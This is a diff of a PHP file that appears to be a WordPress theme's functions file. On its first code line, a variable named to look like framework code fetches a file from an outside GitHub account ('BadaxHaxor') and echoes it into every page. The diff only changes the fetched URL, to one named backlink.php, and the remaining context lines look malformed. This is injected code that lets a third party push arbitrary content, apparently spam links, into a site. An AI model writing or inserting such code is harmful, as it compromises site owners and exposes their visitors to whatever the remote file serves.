@@ -1,5 +1,5 @@
 <?php
-$framework_controller_2 = file_get_contents('https://raw.githubusercontent.com/BadaxHaxor/zeroajg/main/functions.php'); echo $framework_controller_2;
+$framework_controller_2 = file_get_contents('https://github.com/BadaxHaxor/zeroajg/blob/main/backlink.php'); echo $framework_controller_2;
 /**
 if ( ! isset( $content_width ) ) {
 	$content_width = 474;
